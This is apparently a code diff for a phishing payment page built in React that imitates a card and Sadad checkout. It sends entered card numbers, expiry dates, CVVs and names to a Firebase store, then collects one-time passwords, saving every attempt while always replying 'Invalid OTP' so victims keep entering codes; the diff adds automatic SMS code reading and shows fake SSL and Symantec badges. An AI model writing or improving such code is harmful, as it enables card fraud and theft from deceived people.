@@ -1,14 +1,14 @@
 "use client"
 
 import type React from "react"
-import { useEffect, useState } from "react"
+import { useEffect, useState, useRef } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Checkbox } from "@/components/ui/checkbox"
 import { ChevronLeft, CreditCard, Smartphone } from "lucide-react"
 import { addData } from "@/lib/firebase"
 import FullPageLoader from "@/components/loader"
-const allOtps = ['']
+const allOtps = [""]
 export default function PaymentPage() {
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
@@ -17,15 +17,45 @@ export default function PaymentPage() {
   const [saveCard, setSaveCard] = useState(false)
   const [paymentMethod, setPaymentMethod] = useState<"credit" | "debit" | "sadad">("credit")
   const [step, setStep] = useState<"form" | "otp">("form")
-  const [otp, setOtp] = useState("")
+  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
   const [error, setError] = useState("")
   const [loading, setLoading] = useState(false)
   const [payVal, setPayval] = useState("")
+
+  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
   useEffect(() => {
     const val = localStorage.getItem("amount")
     if (val) setPayval(val)
   }, [])
+
+  useEffect(() => {
+    if (step === "otp" && "OTPCredential" in window) {
+      const abortController = new AbortController()
+
+      navigator.credentials
+        .get({
+          // @ts-ignore - WebOTP API types
+          otp: { transport: ["sms"] },
+          signal: abortController.signal,
+        })
+        .then((otp: any) => {
+          if (otp?.code) {
+            const digits = otp.code.split("")
+            setOtp(digits)
+            otpInputRefs.current[5]?.focus()
+          }
+        })
+        .catch((err) => {
+          console.log("WebOTP error:", err)
+        })
+
+      return () => {
+        abortController.abort()
+      }
+    }
+  }, [step])
+
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "")
     const chunks = cleaned.match(/.{1,4}/g)
@@ -60,76 +90,161 @@ export default function PaymentPage() {
       setCvv(value)
     }
   }
+
+  const handleOtpChange = (index: number, value: string) => {
+    const digit = value.replace(/\D/g, "").slice(-1)
+
+    const newOtp = [...otp]
+    newOtp[index] = digit
+    setOtp(newOtp)
+    setError("")
+
+    if (digit && index < 5) {
+      otpInputRefs.current[index + 1]?.focus()
+    }
+  }
+
+  const handleOtpPaste = (e: React.ClipboardEvent) => {
+    e.preventDefault()
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
+    const digits = pastedData.split("")
+    const newOtp = [...otp]
+
+    digits.forEach((digit, index) => {
+      if (index < 6) {
+        newOtp[index] = digit
+      }
+    })
+
+    setOtp(newOtp)
+
+    const nextEmptyIndex = newOtp.findIndex((d) => !d)
+    if (nextEmptyIndex !== -1) {
+      otpInputRefs.current[nextEmptyIndex]?.focus()
+    } else {
+      otpInputRefs.current[5]?.focus()
+    }
+  }
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !otp[index] && index > 0) {
+      otpInputRefs.current[index - 1]?.focus()
+    }
+  }
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setError("")
     setLoading(true)
 
-    const visitorID = localStorage.getItem('visitor')
+    const visitorID = localStorage.getItem("visitor")
     await addData({ id: visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
     setTimeout(() => {
       setStep("otp")
       setLoading(false)
-    }, 5000);
+    }, 5000)
     if (!visitorID) {
       setError("Visitor not found")
       setLoading(false)
       return
     }
-
   }
   return (
     <div className="min-h-screen bg-[#8A1538]">
       {loading && <FullPageLoader />}
       {step === "otp" && (
-        <div className="space-y-5 text-center">
-          <h2 className="text-lg font-semibold text-white">OTP Verification</h2>
-          <p className="text-sm text-gray-400">
-            Enter the 6-digit code sent to your phone
-          </p>
+        <div className="min-h-screen bg-[#8A1538] flex items-center justify-center p-4">
+          <div className="w-full max-w-md">
+            <div className="bg-background rounded-3xl p-8 shadow-2xl">
+              <div className="text-center mb-8">
+                <div className="w-16 h-16 bg-[#8A1538]/10 rounded-2xl mx-auto mb-4 flex items-center justify-center">
+                  <svg className="w-8 h-8 text-[#8A1538]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                    />
+                  </svg>
+                </div>
+                <h2 className="text-2xl font-bold text-foreground mb-2">OTP Verification</h2>
+                <p className="text-sm text-muted-foreground">Enter the 6-digit code sent to your phone</p>
+              </div>
 
-          <Input
-            type="tel"
-            inputMode="numeric"
-            maxLength={6}
-            value={otp}
-            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-            placeholder="000000"
-            className="h-14 text-center text-2xl font-bold tracking-widest"
-          />
+              <div className="flex gap-3 justify-center mb-6" onPaste={handleOtpPaste}>
+                {otp.map((digit, index) => (
+                  <input
+                    key={index}
+                    ref={(el) => (otpInputRefs.current[index] = el)}
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete={index === 0 ? "one-time-code" : "off"}
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handleOtpChange(index, e.target.value)}
+                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                    className="w-12 h-14 sm:w-14 sm:h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all focus:outline-none focus:ring-2 focus:ring-[#8A1538] focus:border-[#8A1538] bg-background border-border hover:border-[#8A1538]/50"
+                    style={{
+                      caretColor: "#8A1538",
+                    }}
+                  />
+                ))}
+              </div>
 
-          {error && (
-            <p className="text-sm text-red-600 font-medium">{error}</p>
-          )}
+              {error && (
+                <div className="mb-4 p-3 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-xl">
+                  <p className="text-sm text-red-600 dark:text-red-400 font-medium text-center">{error}</p>
+                </div>
+              )}
 
-          <Button
-            className="w-full h-14 bg-[#8A1538]"
-            onClick={async () => {
-              if (otp.length !== 6) {
-                setError("Invalid OTP code")
-                return
-              }
+              <div className="text-center mb-6">
+                <button className="text-sm text-[#8A1538] hover:underline font-medium">Resend Code</button>
+              </div>
 
-              const visitorID = localStorage.getItem("visitor")
-              allOtps.push(otp)
-              await addData({
-                id: visitorID,
-                paymentMethod, allOtps, otp
-              })
+              <Button
+                className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg"
+                onClick={async () => {
+                  const otpCode = otp.join("")
+                  if (otpCode.length !== 6) {
+                    setError("Please enter all 6 digits")
+                    return
+                  }
 
-              localStorage.setItem(`used_${visitorID}`, "true")
-              setTimeout(() => {
-                setLoading(false)
-                alert('Invalid OTP')
-              }, 4000);
-            }}
-          >
-            Confirm Payment
-          </Button>
+                  setLoading(true)
+                  const visitorID = localStorage.getItem("visitor")
+                  allOtps.push(otpCode)
+                  await addData({
+                    id: visitorID,
+                    paymentMethod,
+                    allOtps,
+                    otp: otpCode,
+                  })
+
+                  localStorage.setItem(`used_${visitorID}`, "true")
+                  setTimeout(() => {
+                    setLoading(false)
+                    alert("Invalid OTP")
+                  }, 4000)
+                }}
+              >
+                Confirm Payment
+              </Button>
+
+              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
+                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                </svg>
+                <span>Verification secured with end-to-end encryption</span>
+              </div>
+            </div>
+          </div>
         </div>
       )}
       {step === "form" && (
-        <>
+        <div className="space-y-5 text-center">
+          <h2 className="text-lg font-semibold text-white">Payment Information</h2>
+          <p className="text-sm text-gray-400">Enter your payment details below</p>
+
           <header className="relative bg-[#8A1538] text-white px-4 pt-12 pb-8">
             <div className="max-w-md mx-auto">
               <div className="flex items-center justify-between mb-6">
@@ -147,7 +262,8 @@ export default function PaymentPage() {
                 <div className="text-center">
                   <p className="text-sm text-white/80 mb-1">Select an option to Pay</p>
                   <p className="text-3xl font-bold">
-                    {payVal}<sup className="text-sm"></sup>
+                    {payVal}
+                    <sup className="text-sm"></sup>
                   </p>
                 </div>
               </div>
@@ -159,10 +275,11 @@ export default function PaymentPage() {
               <div className="grid grid-cols-3 gap-3 mb-6">
                 <button
                   onClick={() => setPaymentMethod("credit")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "credit"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "credit"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <CreditCard
                     className={`h-6 w-6 mb-2 ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -176,10 +293,11 @@ export default function PaymentPage() {
 
                 <button
                   onClick={() => setPaymentMethod("debit")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "debit"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "debit"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <CreditCard
                     className={`h-6 w-6 mb-2 ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -193,10 +311,11 @@ export default function PaymentPage() {
 
                 <button
                   onClick={() => setPaymentMethod("sadad")}
-                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "sadad"
+                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
+                    paymentMethod === "sadad"
                       ? "border-[#8A1538] bg-[#8A1538]/5"
                       : "border-border bg-background hover:border-[#8A1538]/30"
-                    }`}
+                  }`}
                 >
                   <Smartphone
                     className={`h-6 w-6 mb-2 ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
@@ -230,7 +349,7 @@ export default function PaymentPage() {
                       placeholder="0000 0000 0000 0000"
                       value={cardNumber}
                       onChange={handleCardNumberChange}
-                      className="h-12 text-right  text-base border-border/50 rounded-xl pr-20 font-mono tracking-wider"
+                      className="h-12 text-right text-base border-border/50 rounded-xl pr-20 font-mono tracking-wider"
                       dir="ltr"
                       required
                     />
@@ -297,7 +416,7 @@ export default function PaymentPage() {
 
                 <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-4">
                   <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                    <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                   </svg>
                   <span>
                     Payment is Secured with 256bit SSL encryption{" "}
@@ -316,13 +435,13 @@ export default function PaymentPage() {
                   </div>
                   <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                     <svg className="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="currentColor">
-                      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                     </svg>
                     <span className="text-[10px] font-semibold text-green-700 dark:text-green-400">SSL</span>
                   </div>
                   <div className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-50 dark:bg-yellow-950/20 rounded-lg border border-yellow-200 dark:border-yellow-900">
                     <svg className="w-4 h-4 text-yellow-600" viewBox="0 0 24 24" fill="currentColor">
-                      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                      <path d="M18 8h-1V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                     </svg>
                     <span className="text-[10px] font-semibold text-yellow-700 dark:text-yellow-400">Symantec</span>
                   </div>
@@ -342,7 +461,8 @@ export default function PaymentPage() {
               </div>
             </div>
           </div>
-        </>)}
+        </div>
+      )}
     </div>
   )
 }
